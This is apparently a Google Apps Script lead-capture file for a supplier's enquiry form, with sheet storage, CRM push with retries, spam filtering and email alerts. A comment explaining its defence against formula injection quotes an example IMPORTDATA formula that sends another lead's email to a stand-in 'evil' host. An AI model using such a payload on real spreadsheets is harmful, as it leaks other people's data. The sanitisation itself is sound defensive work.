/**
 * Aurico Alloys - website enquiry capture, with CRM delivery.
 *
 * Receives enquiries from javascript/floating-form.js, writes them to a sheet,
 * forwards them to the Smart Tech CRM, and optionally emails the sales desk.
 *
 * Columns follow ALLOWED_FIELDS: a key the form sends gets a column the first
 * time it arrives. A key not on that list is dropped - see below for why.
 *
 * ---------------------------------------------------------------------------
 * ORDER OF OPERATIONS  (this is the important bit)
 * ---------------------------------------------------------------------------
 * The row is written to the sheet BEFORE the CRM is called, which is also what
 * the CRM's own integration notes ask for: the row number becomes a stable
 * external_id, and a CRM outage can never lose an enquiry. The outcome is
 * recorded in crm_status, and retryFailedCrmPushes() re-sends what is retryable.
 *
 * ---------------------------------------------------------------------------
 * UPDATING THE EXISTING DEPLOYMENT   (this is the usual case)
 * ---------------------------------------------------------------------------
 * 1. Open the leads Google Sheet -> Extensions -> Apps Script.
 * 2. Select all the old code and replace it with this file.
 * 3. Save.
 * 4. Deploy -> Manage deployments -> click the active deployment ->
 *    pencil/edit icon -> Version: "New version" -> Deploy.
 *
 * Do NOT use "New deployment" for an update: that mints a different /exec URL
 * and the site keeps talking to the old code. And editing without deploying a
 * new version changes nothing either - the previous version keeps serving.
 *
 * ---------------------------------------------------------------------------
 * SCRIPT PROPERTIES        Project Settings -> Script Properties
 * ---------------------------------------------------------------------------
 * Credentials live here, never in this file. This file is versioned in a public
 * repository; the bearer token is what tags a lead as AURICO, so anyone holding
 * it could file enquiries in your name.
 *
 *   CRM_WEBHOOK_URL   required, or the CRM step is skipped
 *                     https://us-central1-smart-tech-crm.cloudfunctions.net/websiteEnquiry
 *   CRM_AUTH_VALUE    required, "Bearer <token>" - include the word Bearer
 *   CRM_AUTH_HEADER   optional, defaults to Authorization
 *   NOTIFY_EMAIL      optional, sends an alert per enquiry
 *
 * CRM_API_KEY is deliberately NOT used here. Per the CRM's notes it guards a
 * pull endpoint on your side (CRM -> site, x-api-key); this script only pushes
 * (site -> CRM), so sending it outbound would leak a second secret to no end.
 *
 * ---------------------------------------------------------------------------
 * RETRIES
 * ---------------------------------------------------------------------------
 * Triggers -> Add Trigger -> retryFailedCrmPushes -> Time-driven -> Hourly.
 *
 * The CRM's Vercel cron guidance does not apply to us - that assumes a Next.js
 * host. This time-based trigger is the equivalent, and Apps Script triggers do
 * fire reliably because nothing here is frozen after a response.
 *
 * Retries are safe: the CRM dedupes on external_id and returns the original
 * enquiry rather than creating a second one.
 *
 * ---------------------------------------------------------------------------
 * WHY THE PAYLOAD IS FILTERED AND EVERY CELL IS SANITISED
 * ---------------------------------------------------------------------------
 * This endpoint is deployed "Who has access: Anyone", because the browser has
 * to be able to POST to it without a credential. That is not a mistake to fix -
 * it is what a public enquiry form requires - but it does mean every byte
 * arriving here was written by a stranger, and two things follow from that:
 *
 * 1. A cell beginning = + - or @ is a FORMULA to Google Sheets, not text. A
 *    name submitted as =IMPORTDATA("https://evil/"&ENCODEURL(B2)) executes when
 *    the desk opens the sheet and sends another lead's email address to whoever
 *    wrote it; HYPERLINK() puts a phishing link in the cell under a label of
 *    the attacker's choosing. Every value is therefore prefixed with a single
 *    quote when it opens with one of those characters, which Sheets stores as
 *    text and does not display.
 *
 * 2. syncHeaders() used to add a column for ANY key on the payload. A single
 *    POST carrying 20,000 invented keys would push the sheet past its column
 *    limit, after which every appendRow throws and NO further lead is captured
 *    - every visitor sent to the WhatsApp fallback instead. Keys are now
 *    checked against ALLOWED_FIELDS and anything else is counted and dropped.
 *
 * Neither guard can reject a lead: a sanitised cell is still the visitor's text
 * and a dropped key was never a column. The failure this endpoint must never
 * have is a lost enquiry.
 *
 * ---------------------------------------------------------------------------
 * FIRST-TIME SETUP
 * ---------------------------------------------------------------------------
 * 1. Open the Google Sheet that should hold the leads.
 * 2. Extensions -> Apps Script. Delete whatever is there, paste this in.
 * 3. Deploy -> New deployment -> type "Web app".
 *      Execute as:      Me
 *      Who has access:  Anyone            <- required, or the browser gets a 401
 * 4. Copy the /exec URL into LEAD_ENDPOINTS in javascript/lead-config.js.
 *
 * ---------------------------------------------------------------------------
 * WHICH TAB THE LEADS LAND IN
 * ---------------------------------------------------------------------------
 * SHEET_NAME below is the tab this writes to, and it is created if missing.
 * Column headings are matched to the payload keys exactly and case-sensitively,
 * so pointing this at an existing tab whose headings read "Name" or "Mobile
 * Number" will not reuse those columns - it will add "name" and "phone"
 * alongside them. Letting it start a clean tab avoids the whole problem, and
 * leaves the historic leads untouched in the old one.
 *
 * ---------------------------------------------------------------------------
 * WHY THE RESPONSE SHAPE MATTERS
 * ---------------------------------------------------------------------------
 * ContentService cannot set an HTTP status code - every reply is 200, even
 * after an exception. The website therefore reads {ok:...} out of the body to
 * decide whether the lead really landed, and treats {ok:false} as a hard
 * failure that shows the visitor a WhatsApp fallback. Keep that contract.
 */

var SHEET_NAME = 'Leads';

/**
 * Preferred left-to-right order for a brand new tab. An existing tab keeps the
 * column order it already has; anything new is appended on the right.
 */
var COLUMN_ORDER = [
  'timestamp',
  'name',
  'company',
  'email',
  'phone',
  'country',
  'quantity',
  'inquiry',
  'page_url',
  'page_title',
  'form_location',
  'utm_source',
  'utm_medium',
  'utm_campaign',
  'utm_term',
  'utm_content',
  'gclid',
  'landing_page',
  'referrer',
  'privacy',
  'page',
  'crm_status',
  'crm_id',
  'crm_error'
];

/**
 * Columns this script writes itself, never taken from a payload. They are in
 * COLUMN_ORDER so a new tab places them sensibly, and kept OUT of
 * ALLOWED_FIELDS: a stranger who could post crm_status = 'synced' could keep
 * their row out of the retry run, or label it however they liked.
 */
var SCRIPT_FIELDS = ['crm_status', 'crm_id', 'crm_error'];

/**
 * Fields the form sends for this script to judge, which are deliberately NOT
 * stored: the honeypot's contents and how long the form was open. They are
 * recognised so cleanPayload does not report them as junk, and then dropped so
 * the desk's sheet keeps exactly the columns it has today. What they decided is
 * recorded in spam_reason, on the spam tab, where it is worth reading.
 */
var HONEYPOT_FIELD = 'website';
var TIMING_FIELD = 'form_elapsed_ms';
var SIGNAL_FIELDS = [HONEYPOT_FIELD, TIMING_FIELD];

/**
 * A form filled in faster than this was not filled in by a person. Both form
 * modes build their fields at page load, so the figure covers reading time as
 * well as typing: a real enquiry runs to tens of seconds and the fastest
 * plausible human is still several. Three seconds is far enough below that to
 * cost nothing and still catch a script.
 */
var MIN_FILL_MS = 3000;

/**
 * Suspected spam is written HERE rather than rejected.
 *
 * Rejecting would be the obvious move and it is the wrong one twice over. A
 * false positive would hand a real buyer the "we could not submit" fallback and
 * the enquiry would depend on them bothering with WhatsApp - this endpoint's
 * one unforgivable failure is a lost lead. And a bot told it failed learns
 * that something detected it, which is free information; one told it succeeded
 * goes away satisfied.
 *
 * So a flagged submission is captured like any other, on its own tab, with the
 * notification email skipped and {ok:true} returned. Nothing is lost, the desk's
 * inbox stays clean, and if real enquiries turn up on this tab the threshold
 * above is wrong and can be seen to be wrong.
 */
var SPAM_SHEET_NAME = 'Leads (suspected spam)';

/**
 * The only payload keys that may become columns: COLUMN_ORDER less the columns
 * this script fills in itself. Anything else on a payload was not sent by this
 * site's form, so it is counted and dropped rather than given a column of its
 * own. Add a field to COLUMN_ORDER in the same commit that adds it to
 * floating-form.js.
 */
var ALLOWED_FIELDS = COLUMN_ORDER.filter(function (key) {
  return SCRIPT_FIELDS.indexOf(key) === -1;
});

/** A lead longer than this is not a lead. Sheets caps a cell at 50,000 chars. */
var MAX_FIELD_CHARS = 5000;

/** Whole-body cap, checked before JSON.parse so a huge body costs nothing. */
var MAX_BODY_BYTES = 64 * 1024;

/**
 * Notification emails allowed per rolling hour. MailApp's daily quota is finite
 * (100 on a consumer account), so a flood of junk submissions would otherwise
 * burn it before lunch and the desk would stop being told about the REAL leads
 * for the rest of the day. Past the cap the lead is still written to the sheet -
 * only the email is skipped - because a lead in the sheet is recoverable and a
 * lead that was never captured is not.
 */
var MAX_NOTIFY_PER_HOUR = 40;

/**
 * Makes one value safe to put in a cell.
 *
 * Sheets parses a leading = + - or @ as a formula, so a submitted value
 * starting with one of those is prefixed with a single quote - Sheets stores
 * that as text and does not render the quote. Leading tabs and carriage
 * returns get the same treatment: they are stripped by the parser first, which
 * would expose the character behind them.
 */
function sanitizeCell(value) {
  if (value === undefined || value === null) return '';

  var text = String(value);

  // Objects and arrays would otherwise land as "[object Object]".
  if (typeof value === 'object') {
    try {
      text = JSON.stringify(value);
    } catch (err) {
      text = '';
    }
  }

  if (text.length > MAX_FIELD_CHARS) {
    text = text.slice(0, MAX_FIELD_CHARS) + ' [truncated]';
  }

  if (/^[=+\-@\t\r]/.test(text)) {
    text = "'" + text;
  }

  return text;
}

/**
 * The inverse of sanitizeCell(), for a value that is shown rather than stored.
 *
 * The alert email is plain text and nothing parses it for formulas, so the
 * guard's quote has no job there - it just showed up, and a phone written
 * "+91 98200 00000" reached the desk as "'+91 98200 00000". Only a quote
 * sanitizeCell() could have added is removed: one directly followed by a
 * character it guards against. That is also exactly how Sheets displays the
 * stored cell, so the email and the sheet agree.
 */
function displayText(value) {
  var text = value === undefined || value === null ? '' : String(value);
  return /^'[=+\-@\t\r]/.test(text) ? text.slice(1) : text;
}

/**
 * The buyer's email as the alert's Reply-To, or '' when it is not one plausible
 * address - so that pressing Reply answers the buyer instead of the script's
 * own account.
 *
 * MailApp takes a single address there and this value was typed by a stranger.
 * Whitespace, a newline, a comma or angle brackets would turn it into a list or
 * a display name of their choosing, so any of those rejects it outright rather
 * than being cleaned into something else. So does a leading = + - @ or quote:
 * a formula-shaped "address" is someone probing the sheet, not a buyer. A
 * rejected address is still printed in the body, for the desk to judge.
 */
function replyToAddress(value) {
  var text = displayText(value);
  if (!text || text.length > 254) return '';
  if (/[\s,<>;"()\[\]\\]/.test(text)) return '';
  if (/^[=+\-@']/.test(text)) return '';
  var address = /^[^@]+@[A-Za-z0-9](?:[A-Za-z0-9-]*[A-Za-z0-9])?(?:\.[A-Za-z0-9](?:[A-Za-z0-9-]*[A-Za-z0-9])?)+$/;
  return address.test(text) ? text : '';
}

/**
 * One line of visitor text, safe for a subject or a labelled body line. A
 * newline in a subject is the one place an attacker could write a line of their
 * own choosing into the desk's inbox list - "Website enquiry #7 - ACTION
 * REQUIRED: verify your account" - and in the body it would forge a line of the
 * layout, a second "Email:" under the real one. Control characters and runs of
 * whitespace become one space; `max` caps the length where one is given.
 */
function oneLine(value, max) {
  var text = displayText(value)
    .replace(/[\u0000-\u001f\u007f\u2028\u2029]+/g, ' ')
    .replace(/\s+/g, ' ')
    .trim();
  if (max && text.length > max) {
    text = text.slice(0, max - 1).trim() + '\u2026';
  }
  return text;
}

/**
 * What the enquiry is for, for the subject line: its first non-empty line, less
 * the "Enquiry:" the form seeds it with. The subject used to name only the
 * company and country, so every alert read "Website enquiry #N - <company>" and
 * the desk had to open each one to learn whether it was a price on 625 sheets or a question
 * about delivery. A leading list marker goes too - an enquiry typed as "- 3mm
 * sheet" is not about a dash.
 */
function enquirySubject(inquiry) {
  var lines = displayText(inquiry).split(/\r\n|\r|\n/);
  var first = '';
  for (var i = 0; i < lines.length; i++) {
    if (lines[i].trim()) {
      first = lines[i];
      break;
    }
  }
  first = first
    .replace(/^\s*enquiry\s*:\s*/i, '')
    .replace(/^\s*[-*\u2022]+\s+/, '');
  return oneLine(first, 60);
}

/** Strips anything that is not an expected field, and sanitises what is left. */
function cleanPayload(data) {
  var clean = {};
  var dropped = 0;

  Object.keys(data).forEach(function (key) {
    if (ALLOWED_FIELDS.indexOf(key) === -1) {
      // Expected, judged, and not stored - not junk, so not counted as junk.
      if (SIGNAL_FIELDS.indexOf(key) === -1) dropped++;
      return;
    }
    clean[key] = sanitizeCell(data[key]);
  });

  if (dropped) {
    console.warn('Dropped ' + dropped + ' unrecognised field(s) from a submission.');
  }

  return clean;
}

/**
 * Why this submission looks automated, or '' when it does not.
 *
 * A MISSING timing field is not a reason. GitHub Pages serves floating-form.js
 * with its own cache lifetime, so for a while after any deploy there are real
 * visitors running the previous version of the form, which sends no timing at
 * all - reading absence as guilt would file those as spam. Only a figure that
 * is present and implausibly small counts.
 */
function spamReason(data) {
  var honeypot = String(data[HONEYPOT_FIELD] === undefined ? '' : data[HONEYPOT_FIELD]).trim();
  if (honeypot) {
    return 'honeypot filled: ' + honeypot.slice(0, 200);
  }

  var raw = data[TIMING_FIELD];
  if (raw === undefined || raw === null || raw === '') return '';

  var elapsed = Number(raw);
  if (isNaN(elapsed) || elapsed < 0) return '';

  if (elapsed < MIN_FILL_MS) {
    return 'submitted ' + elapsed + 'ms after the form rendered (minimum ' + MIN_FILL_MS + ')';
  }

  return '';
}

/**
 * True while the hour still has notification budget left. Counted in the script
 * cache rather than a property so it expires on its own and needs no cleanup.
 */
function notifyBudgetRemains() {
  try {
    var cache = CacheService.getScriptCache();
    var key = 'notify_count';
    var count = Number(cache.get(key) || 0);
    if (count >= MAX_NOTIFY_PER_HOUR) return false;
    cache.put(key, String(count + 1), 3600);
    return true;
  } catch (err) {
    // The cache being unavailable must not stop a notification going out.
    return true;
  }
}

function doPost(e) {
  var lock = LockService.getScriptLock();

  try {
    // Two submissions arriving together could otherwise both try to add the
    // same column, or write to the same row.
    lock.waitLock(30000);
  } catch (err) {
    return jsonReply({ ok: false, error: 'Server busy, please retry' });
  }

  try {
    if (!e || !e.postData || !e.postData.contents) {
      return jsonReply({ ok: false, error: 'Empty request body' });
    }

    // Checked before the parse: a multi-megabyte body should cost nothing.
    if (e.postData.contents.length > MAX_BODY_BYTES) {
      return jsonReply({ ok: false, error: 'Request body too large' });
    }

    var parsed = JSON.parse(e.postData.contents);

    // A JSON array or a bare string parses fine and would then have its indices
    // read as field names. Only an object is a payload.
    if (!parsed || typeof parsed !== 'object' || Array.isArray(parsed)) {
      return jsonReply({ ok: false, error: 'Malformed request body' });
    }

    if (!parsed.email && !parsed.phone) {
      return jsonReply({ ok: false, error: 'Enquiry needs an email or a phone number' });
    }

    // Judged on the raw payload, because the signals it reads are dropped by
    // cleanPayload - they are not columns on the desk's sheet.
    var reason = spamReason(parsed);

    var data = cleanPayload(parsed);

    // A lead with no arrival time is much harder to chase, and the browser does
    // not always send one.
    if (!data.timestamp) {
      data.timestamp = new Date().toISOString();
    }

    if (reason) {
      // Set after cleaning, never taken from the payload: an attacker who could
      // write this field could label their own submission whatever they liked.
      data.spam_reason = sanitizeCell(reason);
    } else {
      // Declared before syncHeaders so the columns exist on the row we are
      // about to append; the real values are written back once the CRM has
      // answered. Suspected spam gets none of these: it is never sent to the
      // CRM, and with no crm_status the retry run passes it by.
      data.crm_status = 'pending';
      data.crm_id = '';
      data.crm_error = '';
    }

    var sheet = getSheet(reason ? SPAM_SHEET_NAME : SHEET_NAME);
    var headers = syncHeaders(sheet, data);

    var row = headers.map(function (key) {
      var value = data[key];
      return value === undefined || value === null ? '' : String(value);
    });

    sheet.appendRow(row);
    var rowNumber = sheet.getLastRow();

    // The lead is safe from here on. Everything below is best-effort.
    if (reason) {
      // Captured and then left alone: no CRM push, no email, and the same
      // {ok:true} a real lead gets. See SPAM_SHEET_NAME for why.
      console.warn('Suspected spam filed on "' + SPAM_SHEET_NAME + '" row ' +
        rowNumber + ': ' + reason);
    } else {
      writeCrmStatus(sheet, headers, rowNumber, pushToCrm(data, rowNumber));
      notify(data, rowNumber);
    }

    // rowNumber is a stable identifier for this enquiry, and is what the CRM
    // receives as external_id so it can dedupe on its side.
    return jsonReply({ ok: true, id: rowNumber });
  } catch (err) {
    // Logged so a failure is diagnosable in Executions rather than invisible.
    console.error('Lead capture failed: ' + err);
    return jsonReply({ ok: false, error: String(err && err.message ? err.message : err) });
  } finally {
    lock.releaseLock();
  }
}

/** Health check, so the deployment can be verified in a browser. */
function doGet() {
  var props = PropertiesService.getScriptProperties();
  return jsonReply({
    ok: true,
    service: 'aurico-lead-capture',
    crmUrlSet: !!props.getProperty('CRM_WEBHOOK_URL'),
    crmTokenSet: !!props.getProperty('CRM_AUTH_VALUE')
  });
}

function getSheet(name) {
  var book = SpreadsheetApp.getActiveSpreadsheet();

  // Only true if this script was detached from its spreadsheet, which turns
  // every later call into a confusing null error.
  if (!book) {
    throw new Error(
      'No bound spreadsheet. Open the Sheet and use Extensions -> Apps Script.'
    );
  }

  var wanted = name || SHEET_NAME;
  var sheet = book.getSheetByName(wanted);
  if (!sheet) {
    sheet = book.insertSheet(wanted);
  }
  return sheet;
}

/**
 * Returns the header row, having first added a column for any key on the
 * payload that does not have one yet. New sheets are seeded in COLUMN_ORDER so
 * the common fields read left to right in a sensible order.
 */
function syncHeaders(sheet, data) {
  var lastColumn = sheet.getLastColumn();
  var headers = lastColumn
    ? sheet.getRange(1, 1, 1, lastColumn).getValues()[0].filter(String)
    : [];

  if (!headers.length) {
    headers = COLUMN_ORDER.filter(function (key) {
      return Object.prototype.hasOwnProperty.call(data, key);
    });
  }

  var missing = Object.keys(data).filter(function (key) {
    return headers.indexOf(key) === -1;
  });

  if (missing.length) {
    // Keep known fields in the preferred order; genuinely new ones go on the end.
    missing.sort(function (a, b) {
      var ai = COLUMN_ORDER.indexOf(a);
      var bi = COLUMN_ORDER.indexOf(b);
      if (ai === -1 && bi === -1) return a.localeCompare(b);
      if (ai === -1) return 1;
      if (bi === -1) return -1;
      return ai - bi;
    });
    headers = headers.concat(missing);
  }

  var headerRange = sheet.getRange(1, 1, 1, headers.length);
  headerRange.setValues([headers]);
  headerRange.setFontWeight('bold');
  sheet.setFrozenRows(1);

  return headers;
}

/* ------------------------------------------------------------------ *
 * CRM
 * ------------------------------------------------------------------ */

/**
 * The CRM accepts null for every field except external_id; '' is not null.
 *
 * Values arrive here as stored in the sheet, so a phone typed "+91 98200
 * 00000" carries sanitizeCell()'s guard quote. That quote protects the sheet
 * and means nothing to the CRM, so it comes off here, exactly as it does in
 * the alert email - see displayText().
 */
function orNull(value) {
  if (value === undefined || value === null) return null;
  var text = displayText(value).trim();
  return text === '' ? null : text;
}

/**
 * Builds the CRM request body.
 *
 * Shape is fixed by the Smart Tech websiteEnquiry contract - contact and
 * interest are nested objects, not flat keys. external_id is the only required
 * field and is 'enquiry:' + the sheet row, which is what makes redelivery safe:
 * the CRM dedupes on it and returns the original enquiry.
 */
function buildCrmPayload(data, rowNumber) {
  // The form does not ask for a product id. The enquiry's first line is what the
  // form seeded from the page's breadcrumb ("Enquiry: Inconel 625 Sheets"), so
  // it names the product cleanly; the <title> carries a marketing tail and is
  // only the fallback when the visitor cleared that line.
  var productName = enquirySubject(data.inquiry) || orNull(data.page_title);
  var page = orNull(data.page_url) || orNull(data.page);
  var campaign = orNull(data.utm_campaign);
  var source = orNull(data.utm_source);
  var referrer = orNull(data.referrer);
  var attribution = [
    page ? 'Page: ' + page : null,
    campaign ? 'Campaign: ' + campaign : null,
    source ? 'Source: ' + source : null,
    referrer ? 'Referrer: ' + referrer : null
  ].filter(String).join('\n');

  return {
    external_id: 'enquiry:' + rowNumber,
    source: 'website_enquiry',
    received_at: data.timestamp || new Date().toISOString(),
    contact: {
      full_name: orNull(data.name),
      email: orNull(data.email),
      phone: orNull(data.phone),
      company: orNull(data.company),
      location: orNull(data.country)
    },
    interest: {
      product_id: null,
      product_name: orNull(productName),
      requirement: orNull(data.inquiry),
      // Free text on purpose - the CRM parses "500 kg" / "2 MT" best-effort and
      // keeps the original string in the enquiry notes either way.
      quantity: orNull(data.quantity),
      message: orNull(attribution)
    },
    meta: {
      site_user_id: null
    }
  };
}

/**
 * Sends one lead to the CRM webhook.
 *
 * Returns {status, id, error} rather than throwing: the caller has already
 * saved the lead and must not fail the request because the CRM was unhappy.
 *
 * status is one of:
 *   synced    2xx, including "Duplicate ignored"
 *   failed    5xx or a network error - worth retrying
 *   rejected  4xx - the request itself is wrong, retrying cannot fix it
 */
function pushToCrm(data, rowNumber) {
  var props = PropertiesService.getScriptProperties();
  var url = props.getProperty('CRM_WEBHOOK_URL');

  if (!url) {
    return { status: 'failed', id: '', error: 'CRM_WEBHOOK_URL not set in Script Properties' };
  }

  var headers = {};
  var authValue = props.getProperty('CRM_AUTH_VALUE');
  if (authValue) {
    headers[props.getProperty('CRM_AUTH_HEADER') || 'Authorization'] = authValue;
  }

  try {
    // muteHttpExceptions lets us read a 4xx body instead of throwing, which is
    // the difference between "missing external_id" and a bare failure.
    var response = UrlFetchApp.fetch(url, {
      method: 'post',
      contentType: 'application/json',
      headers: headers,
      payload: JSON.stringify(buildCrmPayload(data, rowNumber)),
      muteHttpExceptions: true,
      followRedirects: true
    });

    var code = response.getResponseCode();
    var body = String(response.getContentText());

    if (code >= 200 && code < 300) {
      return { status: 'synced', id: extractEnquiryId(body), error: '' };
    }

    // 400 bad JSON, 401 bad token, 405 wrong method: all permanent. Retrying
    // these forever would just burn the hourly trigger on a config mistake.
    if (code >= 400 && code < 500) {
      return { status: 'rejected', id: '', error: 'HTTP ' + code + ': ' + body.substring(0, 300) };
    }

    return { status: 'failed', id: '', error: 'HTTP ' + code + ': ' + body.substring(0, 300) };
  } catch (err) {
    // Network-level problem, so retryable.
    return { status: 'failed', id: '', error: String(err && err.message ? err.message : err) };
  }
}

/** Pulls the CRM's own enquiry id out of a success body, if it sent one. */
function extractEnquiryId(body) {
  try {
    var parsed = JSON.parse(body);
    var id = parsed.enquiryId || parsed.enquiry_id || parsed.id;
    return id === undefined || id === null ? '' : String(id);
  } catch (err) {
    return '';
  }
}

/** Writes the CRM outcome back onto a row. */
function writeCrmStatus(sheet, headers, rowNumber, crm) {
  var statusIdx = headers.indexOf('crm_status');
  var idIdx = headers.indexOf('crm_id');
  var errorIdx = headers.indexOf('crm_error');

  if (statusIdx > -1) {
    sheet.getRange(rowNumber, statusIdx + 1).setValue(crm.status);
  }
  if (idIdx > -1 && crm.id) {
    sheet.getRange(rowNumber, idIdx + 1).setValue(crm.id);
  }
  if (errorIdx > -1) {
    sheet.getRange(rowNumber, errorIdx + 1).setValue(crm.error || '');
  }
  if (crm.status !== 'synced') {
    console.error('CRM push ' + crm.status + ' for row ' + rowNumber + ': ' + crm.error);
  }
}

/**
 * Re-sends rows the CRM could not accept for a transient reason.
 *
 * Only 'failed' rows are retried. 'rejected' rows are left alone on purpose:
 * a 400 or 401 is a configuration problem, and hammering the endpoint hourly
 * will not fix it. Clear crm_status by hand once the cause is sorted and the
 * next run will pick them up.
 *
 * Safe to run manually, and intended for an hourly time-based trigger.
 */
function retryFailedCrmPushes() {
  var lock = LockService.getScriptLock();
  try {
    lock.waitLock(30000);
  } catch (err) {
    return;
  }

  try {
    var sheet = getSheet();
    if (sheet.getLastRow() < 2) return;

    var headers = sheet.getRange(1, 1, 1, sheet.getLastColumn()).getValues()[0];
    var statusIdx = headers.indexOf('crm_status');
    if (statusIdx === -1) return;

    var rows = sheet.getRange(2, 1, sheet.getLastRow() - 1, headers.length).getValues();

    for (var i = 0; i < rows.length; i++) {
      var status = String(rows[i][statusIdx]);
      if (status !== 'failed' && status !== 'pending') continue;

      var data = {};
      for (var c = 0; c < headers.length; c++) {
        data[headers[c]] = rows[i][c];
      }

      var rowNumber = i + 2;
      writeCrmStatus(sheet, headers, rowNumber, pushToCrm(data, rowNumber));
    }
  } finally {
    lock.releaseLock();
  }
}

/**
 * One-off check that the credentials work, without going near the live form.
 * Run it from the editor and read the Execution log.
 *
 * Sends external_id "test-<timestamp>". Because the CRM dedupes on external_id
 * this creates one test enquiry per run - tell the CRM side to expect them.
 */
function testCrmConnection() {
  var result = pushToCrm(
    {
      name: 'Connection Test',
      email: 'test@auricoalloys.com',
      phone: '0000000000',
      country: 'India',
      company: 'Aurico Alloys LLP',
      quantity: '100 kg',
      inquiry: 'Ignore - webhook connectivity test',
      page_title: 'Test',
      timestamp: new Date().toISOString()
    },
    'test-' + Date.now()
  );

  console.log('CRM test result: ' + JSON.stringify(result));
  return result;
}

/* ------------------------------------------------------------------ *
 * Notification
 * ------------------------------------------------------------------ */

/**
 * Emails the sales desk. A lead sitting unread in a spreadsheet is not much
 * better than a lead that was never captured, and the site now promises a reply
 * within one working day.
 *
 * `data` is the sanitised payload that went into the sheet. Every value is read
 * back through displayText(), so the email shows what the visitor typed rather
 * than the sheet's formula guard; the sheet itself keeps the guarded values.
 */
function notify(data, rowNumber) {
  var to = PropertiesService.getScriptProperties().getProperty('NOTIFY_EMAIL');
  if (!to) return;

  if (!notifyBudgetRemains()) {
    // The lead is already in the sheet; only the alert is skipped. Logged so a
    // flood is visible in Executions rather than looking like a quiet hour.
    console.warn('Notification skipped: hourly cap reached. Lead #' + rowNumber + ' is in the sheet.');
    return;
  }

  // Single-line fields, flattened. The form's inputs cannot hold a newline, so
  // one here came from a script POSTing directly, and would otherwise forge
  // lines in the subject or the body layout. See oneLine().
  var field = function (key, fallback) {
    return oneLine(data[key]) || fallback;
  };

  // Subject fields are capped as well, so the product and the company both
  // survive into the inbox list rather than one pushing the other off the end.
  var product = enquirySubject(data.inquiry);
  var company = oneLine(data.company, 80);
  var country = oneLine(data.country, 80);

  var subject = 'Website enquiry #' + rowNumber +
    (product ? ' - ' + product : '') +
    (company ? ' - ' + company : '') +
    (country ? ' (' + country + ')' : '');

  var email = field('email', '');
  var replyTo = replyToAddress(data.email);

  var lines = [
    'Name:     ' + field('name', '-'),
    'Company:  ' + field('company', '-'),
    'Email:    ' + (email || '-'),
    'Phone:    ' + field('phone', '-'),
    'Country:  ' + field('country', '-'),
    'Quantity: ' + field('quantity', '-'),
    '',
    'Enquiry:',
    // The one multi-line field, kept as written: sizes and quantities are
    // usually on lines of their own.
    displayText(data.inquiry) || '-',
    '',
    'Page:     ' + (field('page_url', '') || field('page', '-')),
    'Source:   ' + (field('utm_source', '') || field('referrer', 'direct')),
    'Campaign: ' + field('utm_campaign', '-')
  ];

  if (email && !replyTo) {
    // Without a Reply-To, Reply goes back to the account this script sends
    // from - say so, rather than let the desk believe they answered the buyer.
    lines.push('', 'Reply-To not set: the email above does not look like a single valid address.');
  }

  var message = { to: to, subject: subject, body: lines.join('\n') };
  if (replyTo) message.replyTo = replyTo;

  try {
    MailApp.sendEmail(message);
  } catch (err) {
    // A failed notification must never fail the capture - the lead is already
    // safely in the sheet by this point.
    console.error('Notification email failed: ' + err);
  }
}

function jsonReply(payload) {
  return ContentService
    .createTextOutput(JSON.stringify(payload))
    .setMimeType(ContentService.MimeType.JSON);
}
